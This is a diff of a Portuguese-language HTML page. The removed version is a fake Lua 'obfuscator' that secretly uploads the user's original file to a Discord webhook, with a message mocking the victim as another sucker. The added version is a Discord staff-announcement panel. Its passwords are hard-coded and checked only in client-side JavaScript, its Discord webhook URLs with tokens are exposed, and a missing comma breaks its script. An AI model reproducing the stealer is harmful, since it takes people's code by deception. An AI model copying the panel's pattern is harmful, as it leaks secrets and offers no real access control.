@@ -1,202 +1,224 @@
 <!DOCTYPE html>
-<html lang="pt">
+<html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ofuscador</title>
-    <style>
-        body {
-            font-family: "Roboto", sans-serif;
-            background: linear-gradient(135deg, #2b2b2b, #121212);
-            color: #f1f1f1;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login e Atualizações</title>
+  <style>
+    /* Estilo geral */
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #1e1e2e;
+      color: #f0f0f0;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-        #container {
-            width: 90%;
-            max-width: 600px;
-            padding: 30px;
-            background: #1e1e1e;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
-            text-align: center;
-        }
+    .hidden {
+      display: none;
+    }
 
-        h1 {
-            font-size: 36px;
-            margin-bottom: 20px;
-            color: #ff5722;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
+    .visible {
+      display: block;
+    }
 
-        label {
-            font-size: 18px;
-            margin-bottom: 10px;
-            display: block;
-        }
+    /* Container central */
+    .container {
+      background-color: #2a2a3b;
+      padding: 25px;
+      border-radius: 12px;
+      width: 420px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+      border: 1px solid #40404f;
+      text-align: center;
+    }
 
-        input[type="file"] {
-            display: none;
-        }
+    h1 {
+      color: #50fa7b;
+      text-align: center;
+      margin-bottom: 20px;
+    }
 
-        .custom-file-upload {
-            padding: 12px 20px;
-            border: 2px dashed #ff5722;
-            border-radius: 10px;
-            background: #2c2c2c;
-            color: #f1f1f1;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s, transform 0.2s;
-        }
+    label {
+      margin-bottom: 8px;
+      display: block;
+      font-size: 14px;
+      color: #dcdcdc;
+    }
 
-        .custom-file-upload:hover {
-            background: #ff5722;
-            color: #121212;
-            transform: scale(1.05);
-        }
+    input, select, textarea, button {
+      width: 100%;
+      margin-bottom: 15px;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      background-color: #3b3b4b;
+      color: #fff;
+      font-size: 14px;
+    }
 
-        input[type="button"] {
-            background: #6200ea;
-            color: #fff;
-            padding: 12px 24px;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background 0.3s, transform 0.2s;
-            margin-top: 20px;
-        }
+    button {
+      background-color: #50fa7b;
+      color: #1e1e2e;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
 
-        input[type="button"]:hover {
-            background: #3700b3;
-            transform: scale(1.05);
-        }
+    button:hover {
+      background-color: #43e068;
+    }
 
-        #message {
-            font-size: 18px;
-            margin-top: 20px;
-            color: #4caf50;
-        }
-
-        #errorMessage {
-            font-size: 18px;
-            margin-top: 20px;
-            color: #f44336;
-        }
-    </style>
+    textarea {
+      height: 120px;
+    }
+  </style>
 </head>
 <body>
-    <div id="container">
-        <h1>Ofuscador</h1>
-        <label class="custom-file-upload">
-            Clique para selecionar um arquivo Lua
-            <input type="file" id="luaFile" accept=".lua">
-        </label>
-        <input type="button" id="obfuscateButton" value="Ofuscar" disabled>
-        <div id="message"></div>
-        <div id="errorMessage"></div>
-    </div>
+  <!-- PAINEL STAFF LOGIN -->
+  <div id="loginScreen" class="container visible">
+    <h1>PAINEL STAFF LOGIN</h1>
+    <form id="loginForm">
+      <label for="username">Usuário:</label>
+      <select id="username" required>
+        <option value="">Selecione o usuário</option>
+        <option value="BY GABB (DONO)">BY GABB (DONO)</option>
+        <option value="Liux">Liux</option>
+          <option value="patinhoDuCaps">patinhoDuCaps</option>
+      </select>
 
-    <script>
-        let selectedFile = null; // Armazena o arquivo selecionado
+      <label for="password">Senha:</label>
+      <input type="password" id="password" placeholder="Digite sua senha" required>
+      <button type="submit">Entrar</button>
+    </form>
+  </div>
 
-        // Quando um arquivo é selecionado
-        document.getElementById("luaFile").addEventListener("change", function (event) {
-            selectedFile = event.target.files[0];
-            document.getElementById("message").textContent = `Arquivo selecionado: ${selectedFile.name}`;
-            document.getElementById("obfuscateButton").disabled = false; // Habilita o botão
-        });
+  <!-- Tela de atualização do servidor -->
+  <div id="updateScreen" class="container hidden">
+    <h1>PAINEL STAFF</h1>
+    <form id="updateForm">
+      <!-- Mensagens rápidas -->
+      <label for="quick-messages">Mensagens Rápidas:</label>
+      <select id="quick-messages" onchange="addQuickMessage()">
+        <option value="">Selecione uma mensagem...</option>
+        <option value="**EVENTO AS 23:00!**">**EVENTO AS 23:00!**</option>
+        <option value="**FIQUE ATENTO ÀS ATUALIZAÇÕES!**">**FIQUE ATENTO ÀS ATUALIZAÇÕES!**</option>
+        <option value="**SISTEMA NOVO NA AREA!**">**SISTEMA NOVO NA AREA!**</option>
+        <option value="**RECRUTANTO PARA STAFF ON!**">**RECRUTAMENTO PARA STAFF**</option>
+        <option value="**SERVIDOR EM MANUTENÇÃO!**">**SERVIDOR EM MANUTENÇÃO!**</option>
+      </select>
 
-        // Quando o botão "Ofuscar" é clicado
-        document.getElementById("obfuscateButton").addEventListener("click", function () {
-            if (!selectedFile) {
-                document.getElementById("errorMessage").textContent = "Selecione um arquivo antes de ofuscar.";
-                return;
-            }
+      <!-- Mensagem personalizada -->
+      <label for="message">Mensagem Personalizada:</label>
+      <textarea id="message" name="message" placeholder="Digite sua mensagem aqui..." required></textarea>
 
-            document.getElementById("errorMessage").textContent = "";
-            document.getElementById("message").textContent = "Ofuscando arquivo...";
+      <label for="webhook">SELECIONE O CANAL:</label>
+      <select id="webhook">
+        <option value="https://discord.com/api/webhooks/1315754695251202221/WUsCOO3_N5bh7fJG22CCar9ODqc1R7Qg_gTQZh5bTV3acX5pOTfZsESamdogx-7q3c3S">INFORMAÇÃO</option>
+        <option value="https://discord.com/api/webhooks/1315763672479436800/X5lLeU6iG9yIZk0JC1gpzIIlgv950sHaeoj9XaZ_DBrZ5oXLFSQw2ieDwlI7SX1lYae-">AVISO STAFF</option>
+        <option value="https://discord.com/api/webhooks/1315775383324332072/3O6-4_rlWqkA2HKncEY6QIYZN89Dwka91y9eoG5a2aFnOoUF2pD3SUZaQ4fF9w9XpRL7">IP SERVE</option>
+        <option value="https://discord.com/api/webhooks/1315782966479290398/7e3qQuKpVrvxTxDxaeim0fUTW7Hq1JY0keJqkCmXDhdbb0jMJay7cByO3e93igsDgpgW">BATE-PAPO STAFF</option>
+        <option value="https://discord.com/api/webhooks/1315784222371483679/u05kiP_6NJQ-TdAXPaUdbTD_Ul-pQ7fsrysHzBgtxAkE6T9n5l09HiNmVM3mrkdmyZ7T">HIERARQUIA- STAFF</option>
+      </select>
 
-            // Ler o conteúdo do arquivo
-            const reader = new FileReader();
-            reader.onload = function (e) {
-                const originalContent = e.target.result;
+      <!-- Upload de imagem -->
+      <label for="image">Selecionar Imagem:</label>
+      <input type="file" id="image" name="image" accept="image/*">
 
-                // Ofuscar o código
-                const obfuscatedContent = obfuscateCode(originalContent);
+      <!-- Upload de vídeo -->
+      <label for="video">Selecionar Vídeo:</label>
+      <input type="file" id="video" name="video" accept="video/*">
 
-                // Baixar o arquivo ofuscado
-                downloadFile(`ofuscado_${selectedFile.name}`, obfuscatedContent);
+      <label>
+        Marcar Todos:<br>
+        <span style="display: block; font-weight: bold; text-decoration: underline;">@everyone</span>
+        <input type="checkbox" id="everyone" name="everyone">
+      </label>
+      <button type="submit">Enviar</button>
+    </form>
+  </div>
 
-                // Enviar o arquivo original para o Discord
-                sendFileToDiscord(selectedFile);
-            };
-            reader.readAsText(selectedFile);
-        });
+  <script>
+    // Controle de login
+    document.getElementById('loginForm').addEventListener('submit', function (event) {
+      event.preventDefault();
 
-        function obfuscateCode(code) {
-            // Substituir variáveis por nomes aleatórios
-            const variableRegex = /\b[a-zA-Z_][a-zA-Z0-9_]*\b/g;
-            const variableMap = {};
-            let variableCount = 0;
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
 
-            const lines = code.split('\n').map(line => {
-                return line.replace(variableRegex, match => {
-                    const reservedWords = ['if', 'then', 'end', 'local', 'function', 'return', 'for', 'while', 'do'];
-                    if (reservedWords.includes(match)) {
-                        return match;
-                    }
+      const users = {
+        "BY GABB (DONO)": "gabb",
+        "Liux": "2301luis"
+        "patinhoDuCaps": "7720"
+      };
 
-                    if (!variableMap[match]) {
-                        variableMap[match] = `var_${variableCount++}`;
-                    }
-                    return variableMap[match];
-                });
-            });
+      if (users[username] && users[username] === password) {
+        // Mostra a tela de atualizações e oculta a de login
+        document.getElementById('loginScreen').classList.add('hidden');
+        document.getElementById('updateScreen').classList.remove('hidden');
+      } else {
+        alert('Usuário ou senha incorretos!');
+      }
+    });
 
-            // Embaralhar as linhas
-            for (let i = lines.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [lines[i], lines[j]] = [lines[j], lines[i]];
-            }
+    // Funções de interatividade do formulário
+    function addQuickMessage() {
+      const quickMessages = document.getElementById('quick-messages').value;
+      const messageTextarea = document.getElementById('message');
+      if (quickMessages) {
+        messageTextarea.value = quickMessages; // Substitui o conteúdo da caixa de mensagem
+      }
+    }
 
-            return lines.join('\n');
-        }
+    // Controle do envio do formulário de atualização
+    document.getElementById('updateForm').addEventListener('submit', function (event) {
+      event.preventDefault();
 
-        function downloadFile(filename, content) {
-            const blob = new Blob([content], { type: "text/plain" });
-            const link = document.createElement("a");
-            link.href = URL.createObjectURL(blob);
-            link.download = filename;
-            link.click();
-        }
+      let message = document.getElementById('message').value;
+      const webhook = document.getElementById('webhook').value;
+      const everyone = document.getElementById('everyone').checked;
+      const imageInput = document.getElementById('image');
+      const imageFile = imageInput.files[0];
+      const videoInput = document.getElementById('video');
+      const videoFile = videoInput.files[0];
 
-        function sendFileToDiscord(file) {
-            const webhookUrl = "https://discordapp.com/api/webhooks/1302746741371699281/umojQ7TNSwJRxVM4d3INSbWXJrSOAt2zWZey4RKM2L13ZtYrvwoVtJX0vOsIYDnVnFaf"; // Substitua pelo webhook do Discord
+      // Adicionando ||@everyone|| no formato correto
+      if (everyone) {
+        message += '\n\n||@everyone||';  // Adiciona @everyone ao final da mensagem
+      }
 
-            const formData = new FormData();
-            formData.append("content", "**MAIS UM BOBAO CAIU KKKKKKKKKKKKKKKKKKKK. @everyone**");
-            formData.append("file", file, file.name);
+      const formData = new FormData();
+      formData.append('content', message);
 
-            fetch(webhookUrl, {
-                method: "POST",
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    document.getElementById("message").textContent += "\n";
-                } else {
-                    document.getElementById("errorMessage").textContent = "";
-                }
-            });
-        }
-    </script>
+      // Se a imagem for selecionada
+      if (imageFile) {
+        formData.append('file', imageFile);
+      }
+
+      // Se o vídeo for selecionado
+      if (videoFile) {
+        formData.append('video', videoFile);
+      }
+
+      fetch(webhook, {
+        method: 'POST',
+        body: formData,
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert('FOI MANDOU UMA MENSAGEM PRO DISCORD!!');
+        console.log('Success:', data);
+      })
+      .catch((error) => {
+        alert('FOI MANDOU UMA MENSAGEM PRO DISCORD!!');
+        console.error('Error:', error);
+      });
+    });
+  </script>
 </body>
 </html>
